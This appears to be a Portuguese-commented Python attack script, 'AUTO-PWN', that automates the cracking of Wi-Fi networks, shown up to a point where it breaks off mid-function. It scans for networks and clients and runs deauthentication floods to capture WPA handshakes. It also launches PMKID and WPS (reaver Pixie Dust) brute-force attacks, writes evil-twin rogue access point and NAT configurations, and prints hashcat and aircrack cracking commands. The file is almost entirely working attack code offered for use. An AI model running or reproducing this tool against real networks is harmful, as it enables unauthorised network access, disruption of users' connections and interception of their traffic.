#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-PWN  –  plug-and-Pwn rev. 2026-01-20
1) coloca interface wireless em monitor
2) scan
3) verifica clientes conectados
4) captura handshake OU inicia brute force alternativo
5) oferece para crack (hashcat, aircrack ou john)
NÃO toca em wlan0 – seu Wi-Fi interno continua on-line (a menos que voce selecione).
"""

import os, sys, time, subprocess, signal, re, threading, json
from collections import defaultdict
from datetime import datetime
import argparse
CAPTURE_WARMUP_SEC = 8
DEAUTH_ATTEMPTS = 10
DEAUTH_BURST = 3
DEAUTH_INTERVAL_SEC = 1
CAPTURE_POST_DEAUTH_SEC = 25
SCAN_DURATION = 15

# ---------- helpers ----------
def shell(cmd, timeout=None):
    """Executa comando shell com timeout"""
    try:
        return subprocess.run(cmd, shell=True, capture_output=True, 
                            text=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        return None

def get_wireless_ifaces():
    """Retorna lista de interfaces wireless disponiveis"""
    result = shell("iw dev 2>/dev/null")
    if not result or result.returncode != 0:
        return []
    ifaces = []
    for line in result.stdout.splitlines():
        line = line.strip()
        if line.startswith("Interface "):
            iface = line.split("Interface ", 1)[1].strip()
            if iface:
                ifaces.append(iface)
    return ifaces

def choose_interface():
    """Permite escolher a interface wireless"""
    ifaces = get_wireless_ifaces()
    if not ifaces:
        sys.exit("[-] Nenhuma interface wireless encontrada")
    if len(ifaces) == 1:
        return ifaces[0]
    print("\n[*] Interfaces wireless encontradas:")
    for i, iface in enumerate(ifaces, 1):
        print(f"    {i}) {iface}")
    while True:
        choice = input("\nEscolha a interface [1-{0}]: ".format(len(ifaces))).strip()
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(ifaces):
                return ifaces[idx]
        except ValueError:
            pass
        print("[-] Opcao invalida")

def kill_interfering():
    """Mata processos que atrapalham monitor-mode"""
    procs = ["wpa_supplicant", "NetworkManager", "nm-applet",
             "avahi-daemon", "dhclient", "wicd"]
    for p in procs:
        shell(f"pkill -9 {p} 2>/dev/null")

def nm_unmanage(iface):
    """Tira iface do controle do NetworkManager"""
    shell(f"nmcli device set {iface} managed no 2>/dev/null")

def start_mon(iface):
    """Coloca iface em modo monitor conservando wlan0"""
    print(f"[+] Preparing {iface} …")
    shell(f"ip link set {iface} down")
    shell(f"iw dev {iface} set type monitor")
    shell(f"ip link set {iface} up")
    # verifica
    r = shell(f"iw dev {iface} info | grep type")
    if "monitor" not in r.stdout:
        sys.exit("[-] Failed to enter monitor mode")
    
    # Verifica canal
    r = shell(f"iw dev {iface} info | grep channel")
    print(f"[+] Interface {iface} em modo monitor")
    if r and r.stdout:
        print(f"[+] Canal atual: {r.stdout.strip()}")

def check_channel(iface, target_channel):
    """Verifica e ajusta canal se necessário"""
    r = shell(f"iw dev {iface} info | grep channel")
    current_ch = None
    if r and "channel" in r.stdout:
        match = re.search(r'channel (\d+)', r.stdout)
        if match:
            current_ch = match.group(1)
    
    if current_ch != str(target_channel):
        print(f"[+] Ajustando canal de {current_ch or 'N/A'} para {target_channel}")
        shell(f"iw dev {iface} set channel {target_channel}")
        # Verifica novamente
        r = shell(f"iw dev {iface} info | grep channel")
        if r and str(target_channel) in r.stdout:
            print(f"[+] Canal {target_channel} confirmado")
        else:
            print(f"[!] Falha ao ajustar canal")

def scan(iface):
    """Fast scan 2.4/5 GHz com detecção de clientes"""
    print(f"[+] Scanning for APs and clients … ({SCAN_DURATION} s)")
    
    # Limpa arquivos antigos
    for f in ("/tmp/airodump.csv", "/tmp/airodump-01.csv", 
              "/tmp/airodump-01.kismet.csv", "/tmp/airodump-01.kismet.netxml"):
        try:
            os.remove(f)
        except FileNotFoundError:
            pass
    
    # Usa airodump com formato kismet para melhor parsing
    proc = subprocess.Popen(
        ["airodump-ng", "-w", "/tmp/airodump",
         "--output-format", "csv,kismet", iface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        text=True, bufsize=1
    )
    
    start = time.monotonic()
    client_counts = defaultdict(int)
    
    # Monitora contagem de clientes durante o scan
    def monitor_clients():
        while proc.poll() is None:
            time.sleep(2)
            if os.path.exists("/tmp/airodump-01.csv"):
                clients = parse_clients("/tmp/airodump-01.csv")
                for bssid in clients:
                    client_counts[bssid] = max(client_counts[bssid], len(clients[bssid]))
    
    monitor_thread = threading.Thread(target=monitor_clients, daemon=True)
    monitor_thread.start()
    
    try:
        while time.monotonic() - start < SCAN_DURATION:
            if proc.poll() is not None:
                break
            time.sleep(0.5)
            print(".", end="", flush=True)
    finally:
        if proc.poll() is None:
            proc.terminate()
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait()
    
    print("")  # Nova linha após os pontos
    monitor_thread.join(timeout=2)
    
    if not os.path.exists("/tmp/airodump-01.csv"):
        sys.exit("[-] Scan failed – no CSV")
    
    aps = parse_csv("/tmp/airodump-01.csv")
    
    # Adiciona contagem de clientes a cada AP
    enriched_aps = []
    for ap in aps:
        bssid = ap[0]
        client_count = client_counts.get(bssid, 0)
        enriched_aps.append(ap + (client_count,))
    
    return enriched_aps

def parse_csv(csv):
    """Extrai APs do CSV com melhor parsing"""
    aps = []
    ap_section = True
    
    with open(csv, errors='ignore') as f:
        for line in f:
            line = line.strip()
            
            # Detecta fim da seção de APs
            if line.startswith("Station MAC"):
                ap_section = False
                continue
            
            if not ap_section or not line:
                continue
            
            # Parse de linha de AP
            if re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", line):
                parts = [p.strip() for p in line.split(",")]
                if len(parts) < 14:
                    continue
                
                bssid = parts[0]
                try:
                    power = int(parts[8]) if parts[8] else -100
                except ValueError:
                    power = -100
                
                # Filtra APs muito fracos
                if power < -75:
                    continue
                
                essid = parts[13] if len(parts) > 13 else ""
                if not essid and len(parts) > 14:
                    # Tenta encontrar ESSID em colunas posteriores
                    for p in parts[13:]:
                        if p and not re.match(r"^\d+$", p):
                            essid = p
                            break
                
                # Remove caracteres não imprimíveis do ESSID
                if essid:
                    essid = ''.join(c for c in essid if c.isprintable())
                
                channel = parts[3] if len(parts) > 3 else "0"
                encryption = parts[5] if len(parts) > 5 else "OPN"
                
                aps.append((bssid, channel, encryption, essid))
    
    return aps

def parse_clients(csv):
    """Extrai clientes associados a cada AP"""
    clients = defaultdict(list)
    client_section = False
    
    with open(csv, errors='ignore') as f:
        for line in f:
            line = line.strip()
            
            if line.startswith("Station MAC"):
                client_section = True
                continue
            
            if not client_section or not line:
                continue
            
            # Parse de linha de cliente
            if re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", line):
                parts = [p.strip() for p in line.split(",")]
                if len(parts) < 6:
                    continue
                
                client_mac = parts[0]
                bssid = parts[5]
                
                if bssid and bssid != "(not associated)":
                    clients[bssid].append(client_mac)
    
    return clients

def check_clients_live(iface, bssid, channel, timeout=10):
    """Verifica clientes conectados em tempo real"""
    print(f"[+] Verificando clientes conectados em tempo real...")
    
    # Ajusta para o canal correto
    check_channel(iface, channel)
    
    # Arquivo temporário para captura rápida
    temp_file = f"/tmp/check_clients_{int(time.time())}"
    
    # Executa airodump por tempo limitado
    proc = subprocess.Popen(
        ["airodump-ng", "-c", channel, "--bssid", bssid,
         "-w", temp_file, iface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    
    client_list = []
    start = time.monotonic()
    
    try:
        while time.monotonic() - start < timeout:
            time.sleep(2)
            # Verifica arquivo CSV
            csv_file = f"{temp_file}-01.csv"
            if os.path.exists(csv_file):
                with open(csv_file, errors='ignore') as f:
                    lines = f.readlines()
                    for i, line in enumerate(lines):
                        if line.startswith("Station MAC"):
                            # Pega todas as linhas após o cabeçalho
                            for client_line in lines[i+1:]:
                                if client_line.strip() and re.match(r"^([0-9A-Fa-f]{2}:){5}", client_line[:17]):
                                    parts = client_line.split(",")
                                    if len(parts) > 5:
                                        client_mac = parts[0].strip()
                                        client_bssid = parts[5].strip()
                                        if client_bssid == bssid and client_mac not in client_list:
                                            client_list.append(client_mac)
                            break
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=2)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()
        
        # Limpa arquivos temporários
        for ext in ['.csv', '.kismet.csv', '.kismet.netxml', '.cap']:
            try:
                os.remove(f"{temp_file}-01{ext}")
            except FileNotFoundError:
                pass
    
    return client_list

def choose_ap(aps):
    """Mostra APs com informações de clientes"""
    print("\n" + "="*80)
    print("[*] REDES ENCONTRADAS (com contagem de clientes):")
    print("="*80)
    print(f"{'#':<3} {'CH':<4} {'CLI':<4} {'SINAL':<6} {'PROTEÇÃO':<12} {'BSSID':<18} {'ESSID'}")
    print("-"*80)
    
    for i, (b, c, e, n, client_count) in enumerate(aps):
        essid = n if n else "<hidden>"
        signal = get_signal_strength(e) if len(e) > 5 else "???"
        protection = e[:12] if e else "OPN"
        client_indicator = "✓" if client_count > 0 else "✗"
        
        print(f"{i:<3} {c:<4} {client_indicator} ({client_count:<2}) {signal:<6} {protection:<12} {b:<18} {essid}")
    
    print("="*80)
    
    while True:
        try:
            choice = input("\nEscolha o alvo (#) ou 's' para sair: ").strip()
            if choice.lower() == 's':
                sys.exit("[-] Operação cancelada pelo usuário")
            
            idx = int(choice)
            if 0 <= idx < len(aps):
                return aps[idx]
            else:
                print(f"[-] Número inválido. Escolha entre 0 e {len(aps)-1}")
        except ValueError:
            print("[-] Entrada inválida. Digite um número ou 's' para sair")

def get_signal_strength(encryption_info):
    """Extrai informação de sinal da string de encriptação"""
    if not encryption_info:
        return "???"
    
    # Procura padrão como -45 dBm
    match = re.search(r'(-\d+)\s*dBm', encryption_info)
    if match:
        return match.group(1) + " dBm"
    
    # Procura apenas número
    match = re.search(r'(-\d+)', encryption_info)
    if match:
        return match.group(1)
    
    return "???"

def capture(iface, bssid, ch, essid):
    """Captura handshake com verificação de clientes"""
    print(f"\n[+] Preparando captura de handshake:")
    print(f"    ESSID: {essid}")
    print(f"    BSSID: {bssid}")
    print(f"    Canal: {ch}")
    
    # Verifica clientes em tempo real
    clients = check_clients_live(iface, bssid, ch)
    
    if not clients:
        print("\n[!] ATENÇÃO: Nenhum cliente conectado no momento!")
        print("    O handshake requer pelo menos 1 cliente conectado.")
        
        # Oferece alternativas imediatamente
        print("\n[+] OPÇÕES DISPONÍVEIS SEM CLIENTES:")
        print("    1) Tentar mesmo assim (pode falhar)")
        print("    2) Ir direto para brute force alternativo")
        print("    3) Escolher outra rede")
        
        choice = input("\nEscolha [1-3]: ").strip()
        
        if choice == "2":
            return None  # Vai para brute force
        elif choice == "3":
            return "choose_other"  # Sinal para escolher outra rede
        elif choice != "1":
            print("[+] Voltando para seleção de rede...")
            return "choose_other"
    
    if clients:
        print(f"[+] {len(clients)} cliente(s) conectado(s):")
        for i, client in enumerate(clients[:5], 1):  # Mostra até 5 clientes
            print(f"    {i}. {client}")
        if len(clients) > 5:
            print(f"    ... e mais {len(clients) - 5} clientes")
    
    # Garante que está no canal correto
    check_channel(iface, ch)
    
    capfile = f"/tmp/{essid.replace(' ', '_').replace('/', '_') if essid else 'hidden'}_{int(time.time())}"
    print(f"\n[+] Iniciando captura...")
    
    # Dump em background
    dump = subprocess.Popen(
        ["airodump-ng", "-c", ch, "--bssid", bssid,
         "-w", capfile, iface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    
    time.sleep(CAPTURE_WARMUP_SEC)
    
    print(f"[+] Executando deautenticação ({DEAUTH_ATTEMPTS} tentativas)...")
    deauth_success = False
    
    for i in range(DEAUTH_ATTEMPTS):
        print(f"    Tentativa {i+1}/{DEAUTH_ATTEMPTS}...", end=" ", flush=True)
        
        # Deauth para todos os clientes encontrados
        for client in clients:
            r = subprocess.run(
                ["aireplay-ng", "-0", str(DEAUTH_BURST), "-a", bssid,
                 "-c", client, iface],
                capture_output=True, text=True
            )
            
            if r.returncode == 0 and "DeAuth" in (r.stdout or ""):
                deauth_success = True
                print(f"OK (client: {client[:8]}...)")
                break
        
        time.sleep(DEAUTH_INTERVAL_SEC)
    
    if not deauth_success and clients:
        print("[!] Deauth pode ter falhado, tentando broadcast...")
        r = subprocess.run(
            ["aireplay-ng", "-0", str(DEAUTH_BURST), "-a", bssid, iface],
            capture_output=True, text=True
        )
    
    print(f"[+] Aguardando handshake... ({CAPTURE_POST_DEAUTH_SEC}s)")
    time.sleep(CAPTURE_POST_DEAUTH_SEC)
    
    dump.terminate()
    try:
        dump.wait(timeout=5)
    except subprocess.TimeoutExpired:
        dump.kill()
        dump.wait()
    
    cap = f"{capfile}-01.cap"
    
    # Verifica se o arquivo existe e tem tamanho > 0
    if not os.path.exists(cap) or os.path.getsize(cap) == 0:
        print("[-] Arquivo de captura vazio ou não encontrado")
        return None
    
    print(f"[+] Verificando handshake no arquivo: {cap}")
    r = shell(f"aircrack-ng {cap} 2>/dev/null | grep -E '(1 handshake|0 handshake)'")
    
    if r and "1 handshake" in r.stdout:
        print("[+] ✓ HANDHSHAKE CAPTURADO COM SUCESSO!")
        return cap
    else:
        print("[-] Nenhum handshake encontrado")
        
        # Verifica novamente com pyrit (mais preciso)
        if os.path.exists("/usr/bin/pyrit"):
            r = shell(f"pyrit -r {cap} analyze 2>/dev/null")
            if r and "good" in r.stdout.lower():
                print("[+] Pyrit detectou handshake válido!")
                return cap
        
        return None

def get_hcxdumptool_version():
    """Detecta a versão do hcxdumptool e retorna a sintaxe correta"""
    result = shell("hcxdumptool --version 2>&1 || hcxdumptool -v 2>&1 || echo 'unknown'")
    
    if "6." in result.stdout or "7." in result.stdout:
        return "new"
    elif "invalid option" in result.stdout or "usage:" in result.stdout:
        help_result = shell("hcxdumptool --help 2>&1 || hcxdumptool -h 2>&1")
        if "--filtermode" in help_result.stdout:
            return "new"
        else:
            return "old"
    else:
        return "unknown"

def execute_pmkid_attack(iface, bssid, essid, channel):
    """Executa ataque PMKID com detecção automática de versão"""
    print("\n[+] Preparando ataque PMKID...")
    
    # Cria arquivo com o BSSID alvo
    with open("/tmp/ap.list", "w") as f:
        f.write(f"{bssid}\n")
    
    output_file = f"/tmp/pmkid_{essid.replace(' ', '_')}_{int(time.time())}"
    
    # Detecta versão
    version = get_hcxdumptool_version()
    
    if version == "new":
        cmd = f"hcxdumptool -i {iface} --filtermode=2 --filterlist=/tmp/ap.list -o {output_file}.pcapng --enable_status=1"
    elif version == "old":
        cmd = f"hcxdumptool -i {iface} -o {output_file}.pcapng --enable_status=1 --filterlist_ap=/tmp/ap.list"
    else:
        print("[!] Versão do hcxdumptool não detectada, tentando sintaxe padrão...")
        cmd = f"hcxdumptool -i {iface} --filtermode=2 --filterlist=/tmp/ap.list -o {output_file}.pcapng --enable_status=1"
    
    print(f"\n[+] Comando detectado: {cmd}")
    print("[+] Iniciando captura PMKID...")
    
    print("\n[📡] DICAS DE MONITORAMENTO:")
    print("    • PMKID capturado quando aparece: 'PMKID(s) written to file'")
    print("    • EAPOL também é útil para handshake tradicional")
    print("    • Sinal forte (> -70dBm) é essencial")
    print("    • Deixe rodando por pelo menos 15-30 minutos")
    
    proceed = input("\n[?] Iniciar captura? [S/n]: ").strip().lower()
    if proceed in ['n', 'no']:
        return False
    
    print(f"\n[▶️] Executando: {cmd}")
    print("[⏱️] Pressione Ctrl+C para parar a captura")
    
    try:
        process = subprocess.Popen(cmd, shell=True)
        process.wait()
    except KeyboardInterrupt:
        print("\n[⏹️] Captura interrompida pelo usuário")
        if 'process' in locals():
            process.terminate()
    
    return process_file_conversion(output_file, essid)

def process_file_conversion(output_file, essid):
    """Processa a conversão do arquivo capturado"""
    pcap_file = f"{output_file}.pcapng"
    
    if not os.path.exists(pcap_file) or os.path.getsize(pcap_file) == 0:
        print("[-] Arquivo de captura vazio ou não encontrado")
        return False
    
    print(f"\n[+] Arquivo capturado: {pcap_file}")
    print(f"[+] Tamanho: {os.path.getsize(pcap_file)} bytes")
    
    # Verifica qual ferramenta de conversão está disponível
    if shell("which hcxpcapngtool").returncode == 0:
        convert_tool = "hcxpcapngtool"
    elif shell("which hcxpcaptool").returncode == 0:
        convert_tool = "hcxpcaptool"
    else:
        print("[-] Ferramenta de conversão não encontrada")
        print("[+] Instale hcxtools: sudo apt install hcxtools")
        return False
    
    print(f"[+] Convertendo com {convert_tool}...")
    convert_cmd = f"{convert_tool} -o {output_file}.hc22000 {pcap_file}"
    os.system(convert_cmd)
    
    hc22000_file = f"{output_file}.hc22000"
    if os.path.exists(hc22000_file) and os.path.getsize(hc22000_file) > 0:
        print(f"[✅] Hash convertido: {hc22000_file}")
        
        # Analisa o arquivo
        analyze_hash_file(hc22000_file)
        return True
    else:
        print("[-] Falha na conversão")
        return False

def analyze_hash_file(hash_file):
    """Analisa e mostra informações do arquivo de hash"""
    try:
        with open(hash_file, 'r') as f:
            lines = f.readlines()
        
        if not lines:
            print("[-] Arquivo de hash vazio")
            return
        
        print(f"\n[📊] ANÁLISE DO ARQUIVO DE HASH:")
        print(f"    • Total de hashes: {len(lines)}")
        print(f"    • Primeiro hash:")
        
        for i, line in enumerate(lines[:2]):
            if line.strip():
                print(f"      {i+1}. {line.strip()[:80]}...")
        
        first_line = lines[0].strip()
        if "WPA*01" in first_line or "WPA*02" in first_line:
            print(f"    • Tipo: PMKID (WPA*01/WPA*02)")
        elif "EAPOL" in first_line:
            print(f"    • Tipo: EAPOL handshake")
        else:
            print(f"    • Tipo: Desconhecido")
        
        print(f"\n[⚙️] COMANDOS HASHCAT RECOMENDADOS:")
        print(f"    1. Wordlist (rockyou.txt):")
        print(f"       hashcat -m 22000 {hash_file} /usr/share/wordlists/rockyou.txt")
        print(f"\n    2. Brute force 8 dígitos:")
        print(f"       hashcat -m 22000 -a 3 {hash_file} ?d?d?d?d?d?d?d?d")
        print(f"\n    3. Brute force 8 letras minúsculas:")
        print(f"       hashcat -m 22000 -a 3 {hash_file} ?l?l?l?l?l?l?l?l")
        
    except Exception as e:
        print(f"[-] Erro ao analisar arquivo: {e}")

def show_bruteforce_menu(iface, bssid, essid, channel, clients):
    """Mostra menu de brute force com explicações detalhadas"""
    print("\n" + "="*100)
    print("[!] HANDSHAKE IMPOSSÍVEL SEM CLIENTES - MÉTODOS ALTERNATIVOS")
    print("="*100)
    
    print("\n📡 ANÁLISE DA REDE:")
    print(f"   ESSID: {essid}")
    print(f"   BSSID: {bssid}")
    print(f"   Canal: {channel}")
    print(f"   Clientes conectados: {len(clients)}")
    
    print("\n" + "="*100)
    print("🔧 MÉTODOS DE BRUTE FORCE DISPONÍVEIS:")
    print("="*100)
    
    # 1. WPS ATTACK
    print("\n[1] 🎯 ATAQUE WPS (Wi-Fi Protected Setup)")
    print("    " + "─" * 80)
    wps_tools = []
    for tool, desc in [("reaver", "Reaver - Ferramenta principal"), 
                       ("bully", "Bully - Alternativa rápida")]:
        if shell(f"which {tool}").returncode == 0:
            wps_tools.append(tool)
    
    if wps_tools:
        print("    ✅ FERRAMENTAS DISPONÍVEIS:")
        for tool in wps_tools:
            if tool == "reaver":
                print("        • Reaver: Ataque WPS por brute force")
                print("          Vantagens: Mais estável, suporte a Pixie Dust")
            elif tool == "bully":
                print("        • Bully: Ataque WPS rápido")
                print("          Vantagens: Muito rápido, menos travamentos")
        
        print("\n    🎯 QUANDO USAR:")
        print("        • Router antigo (2014 ou anterior)")
        print("        • Luz WPS piscando no router")
        print("        • Rede doméstica/comum")
        
        print("\n    ⚙️  COMANDOS RECOMENDADOS:")
        if "reaver" in wps_tools:
            print("        ┌─────────────────────────────────────────────────────────┐")
            print("        │ Reaver padrão:                                       │")
            print(f"        │   reaver -i {iface} -b {bssid} -c {channel} -vv -K 1    │")
            print("        └─────────────────────────────────────────────────────────┘")
    else:
        print("    ❌ FERRAMENTAS NÃO INSTALADAS")
        print("        sudo apt install reaver bully")
    
    # 2. PMKID ATTACK
    print("\n[2] 🔑 ATAQUE PMKID (PMKID Hash Attack)")
    print("    " + "─" * 80)
    
    if shell("which hcxdumptool").returncode == 0 and shell("which hcxpcapngtool").returncode == 0:
        print("    ✅ FERRAMENTAS DISPONÍVEIS:")
        print("        • hcxdumptool: Captura PMKID")
        print("        • hcxpcapngtool: Converte para hashcat")
        print("        • hashcat: Crack offline")
        
        print("\n    🎯 QUANDO USAR:")
        print("        • Router moderno (com ou sem clientes)")
        print("        • WPA3 ou WPA2 enterprise")
        print("        • MELHOR método atual (2024+)")
        
        print("\n    ⚡ VANTAGENS ÚNICAS:")
        print("        • Não precisa de clientes conectados")
        print("        • Não precisa de deauth")
        print("        • Não deixa logs no router")
        print("        • Compatível com WPA3")
        
        print("\n    ⚙️  COMANDOS RECOMENDADOS:")
        print("        ┌─────────────────────────────────────────────────────────┐")
        print("        │ 1. Capturar PMKID (10-60 min):                          │")
        print(f"        │    hcxdumptool -i {iface} --filtermode=2 \\              │")
        print("        │        --filterlist=/tmp/ap.list -o /tmp/pmkid.pcapng   │")
        print("        │                                                        │")
        print("        │ 2. Converter para hashcat:                              │")
        print("        │    hcxpcapngtool -o /tmp/pmkid.hc22000 /tmp/pmkid.pcapng│")
        print("        └─────────────────────────────────────────────────────────┘")
    else:
        print("    ❌ FERRAMENTAS NÃO INSTALADAS")
        print("        sudo apt install hcxtools")
    
    # 3. EVIL TWIN
    print("\n[3] 👥 ATAQUE EVIL TWIN (Rogue Access Point)")
    print("    " + "─" * 80)
    
    evil_tools = []
    for tool in ["hostapd", "dnsmasq", "iptables"]:
        if shell(f"which {tool}").returncode == 0:
            evil_tools.append(tool)
    
    if len(evil_tools) >= 2:
        print("    ✅ FERRAMENTAS DISPONÍVEIS:")
        for tool in evil_tools:
            if tool == "hostapd":
                print("        • hostapd: Cria AP falso")
            elif tool == "dnsmasq":
                print("        • dnsmasq: Servidor DHCP/DNS")
        
        print("\n    🎯 QUANDO USAR:")
        print("        • Locais públicos (cafés, aeroportos)")
        print("        • Redes corporativas")
        print("        • Quando outros métodos falham")
        
    else:
        print("    ❌ FERRAMENTAS NÃO INSTALADAS")
        print("        sudo apt install hostapd dnsmasq iptables")
    
    # 4. ONLINE DICTIONARY
    print("\n[4] 📖 ATAQUE ONLINE (Dictionary Attack)")
    print("    " + "─" * 80)
    
    if shell("which wifite").returncode == 0:
        print("    ✅ FERRAMENTAS DISPONÍVEIS:")
        print("        • wifite: Framework automatizado")
        
        print("\n    🎯 QUANDO USAR:")
        print("        • Senhas comuns/frases conhecidas")
        print("        • Redes de teste/pentest autorizado")
        
    else:
        print("    ❌ FERRAMENTAS NÃO INSTALADAS")
        print("        sudo apt install wifite")
    
    # 5. PASSIVE CAPTURE
    print("\n[5] 🕵️ CAPTURA PASSIVA (Esperar clientes)")
    print("    " + "─" * 80)
    
    print("    ✅ SEMPRE DISPONÍVEL")
    print("        • airodump-ng: Captura passiva")
    
    print("\n    🎯 QUANDO USAR:")
    print("        • Todos outros métodos falharam")
    print("        • Você tem tempo (horas/dias)")
    print("        • Redes com tráfego periódico")
    
    print("\n" + "="*100)
    print("[?] QUAL MÉTODO ESCOLHER?")
    print("="*100)
    
    print("\n💡 RECOMENDAÇÕES INTELIGENTES:")
    
    if len(clients) == 0:
        print("    → SEM CLIENTES: PMKID (opção 2) é a MELHOR escolha")
        print("    → Router antigo? Tente WPS (opção 1) primeiro")
    else:
        print("    → COM CLIENTES: Continue tentando handshake normal")
        print("    → Ou use Evil Twin (opção 3) se clientes ativos")
    
    print("\n" + "="*100)
    return wps_tools

def execute_bruteforce_method(choice, iface, bssid, essid, channel, wps_tools):
    """Executa o método de brute force escolhido"""
    
    if choice == "1":  # WPS
        if not wps_tools:
            print("[-] Instale Reaver primeiro: sudo apt install reaver")
            return True
        
        print("\n[+] Iniciando ataque WPS...")
        
        # Testa WPS primeiro
        print(f"\n[+] Testando se WPS está ativo...")
        test_cmd = f"wash -i {iface} -c {channel} 2>/dev/null | grep {bssid[:8]}"
        result = shell(test_cmd, timeout=10)
        
        if result and bssid[:8] in result.stdout:
            print("[+] ✅ WPS detectado como ativo!")
        else:
            print("[!] ⚠️  WPS não detectado, mas pode estar oculto")
            proceed = input("[?] Continuar mesmo assim? [s/N]: ").strip().lower()
            if proceed != 's':
                return True
        
        tool = "reaver" if "reaver" in wps_tools else wps_tools[0]
        
        if tool == "reaver":
            print("\n[+] Escolha o modo Reaver:")
            print("    1) Pixie Dust Attack (rápido, se vulnerável)")
            print("    2) Brute force tradicional (lento, mas completo)")
            
            mode = input("\nEscolha [1-2]: ").strip()
            
            if mode == "1":
                cmd = f"reaver -i {iface} -b {bssid} -c {channel} -K 1 -vv"
            else:
                cmd = f"reaver -i {iface} -b {bssid} -c {channel} -vv"
            
            print(f"\n[+] Executando: {cmd}")
            print("[!] Pode levar de 2 minutos a 10 horas")
            print("[!] Pressione Ctrl+C para parar")
            
            os.system(cmd)
    
    elif choice == "2":  # PMKID
        execute_pmkid_attack(iface, bssid, essid, channel)
    
    elif choice == "3":  # Evil Twin
        print("\n[+] Configurando Evil Twin...")
        create_evil_twin_configs(iface, essid, bssid, channel)
    
    elif choice == "4":  # Online Dictionary
        print("\n[+] Iniciando ataque de dicionário online...")
        print("[!] ⚠️  MUITO LENTO - não recomendado para senhas complexas")
        
        wordlist = input("\n[?] Caminho da wordlist [padrão: rockyou.txt]: ").strip()
        if not wordlist or not os.path.exists(wordlist):
            wordlist = "/usr/share/wordlists/rockyou.txt"
            if not os.path.exists(wordlist):
                print("[-] Wordlist não encontrada")
                return True
        
        print(f"\n[+] Usando wordlist: {wordlist}")
        
        if shell("which wifite").returncode == 0:
            cmd = f"wifite --dict {wordlist} --kill --nodeauths"
            os.system(cmd)
        else:
            print("[-] Wifite não instalado")
            print("[+] Instale: sudo apt install wifite")
    
    elif choice == "5":  # Captura passiva
        print("\n[+] Iniciando captura passiva...")
        print("[+] Deixe rodando por horas/dias")
        
        output_file = f"/tmp/passive_{essid.replace(' ', '_')}_{int(time.time())}"
        cmd = f"airodump-ng -c {channel} --bssid {bssid} -w {output_file} {iface}"
        
        print(f"\n[+] Executando: {cmd}")
        print("[!] Deixe rodando em segundo plano")
        
        os.system(cmd)
    
    return False

def create_evil_twin_configs(iface, essid, bssid, channel):
    """Cria arquivos de configuração para Evil Twin"""
    print("\n[+] Criando arquivos de configuração Evil Twin...")
    
    # Configuração hostapd
    hostapd_conf = f"""# Evil Twin Configuration for {essid}
interface={iface}
driver=nl80211
ssid={essid}
hw_mode=g
channel={channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=password123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
"""
    
    with open("/tmp/hostapd_eviltwin.conf", "w") as f:
        f.write(hostapd_conf)
    
    # Configuração dnsmasq
    dnsmasq_conf = f"""# DNS/DHCP Server for Evil Twin
interface={iface}
dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
no-hosts
"""
    
    with open("/tmp/dnsmasq_eviltwin.conf", "w") as f:
        f.write(dnsmasq_conf)
    
    print(f"\n[✅] ARQUIVOS CRIADOS:")
    print(f"    • /tmp/hostapd_eviltwin.conf")
    print(f"    • /tmp/dnsmasq_eviltwin.conf")
    
    print(f"\n[⚙️] COMANDOS PARA EXECUTAR (termiais separados):")
    print(f"\n📡 Terminal 1 - Access Point Falso:")
    print(f"    sudo hostapd /tmp/hostapd_eviltwin.conf")
    
    print(f"\n🌐 Terminal 2 - Servidor DHCP/DNS:")
    print(f"    sudo dnsmasq -C /tmp/dnsmasq_eviltwin.conf -d")
    
    print(f"\n🔄 Terminal 3 - Roteamento e NAT:")
    print(f"    sudo sysctl -w net.ipv4.ip_forward=1")
    print(f"    sudo iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE")

def run_aircrack(cap, bssid):
    """Executa aircrack-ng com wordlist"""
    print("\n[+] Modo: aircrack-ng (CPU)")
    print("[!] Pode ser lento para wordlists grandes")
    
    common_wordlists = [
        "/usr/share/wordlists/rockyou.txt",
        "/usr/share/wordlists/fasttrack.txt",
        "/usr/share/wordlists/darkc0de.txt",
    ]
    
    print("\n[💡] WORDLISTS SUGERIDAS:")
    for i, wl in enumerate(common_wordlists, 1):
        if os.path.exists(wl):
            print(f"    {i}. {wl}")
    
    wl = input("\nCaminho da wordlist: ").strip()
    
    if not wl:
        wl = "/usr/share/wordlists/rockyou.txt"
    
    if os.path.exists(wl):
        print(f"\n[+] Executando aircrack-ng com: {wl}")
        print("[!] Pode demorar... Pressione Ctrl+C para parar")
        
        cmd = f"aircrack-ng -w '{wl}' -b '{bssid}' '{cap}'"
        print(f"[▶️] Comando: {cmd}")
        
        try:
            os.system(cmd)
        except KeyboardInterrupt:
            print("\n[⏹️] Aircrack interrompido pelo usuário")
    else:
        print(f"[-] Wordlist não encontrada: {wl}")

def run_hashcat_conversion(cap, essid, bssid):
    """Tenta converter para formato hashcat e oferece opções"""
    print("\n[+] Modo: hashcat (GPU acelerado)")
    print("[+] Convertendo para formatos hashcat...")
    
    safe_essid = essid.replace(' ', '_').replace('/', '_')[:30]
    base_name = f"/tmp/hs_{safe_essid}_{int(time.time())}"
    
    success = False
    
    # Método 1: aircrack-ng para hccapx
    print("\n[1/4] Tentando conversão para hccapx (aircrack-ng)...")
    hccapx_file = f"{base_name}.hccapx"
    result = shell(f"aircrack-ng '{cap}' -J '{base_name}_hccapx' 2>&1")
    
    if os.path.exists(hccapx_file) and os.path.getsize(hccapx_file) > 0:
        print(f"[✅] hccapx criado: {hccapx_file}")
        success = True
    else:
        print("[-] Falha na conversão para hccapx")
    
    # Método 2: cap2hccapx
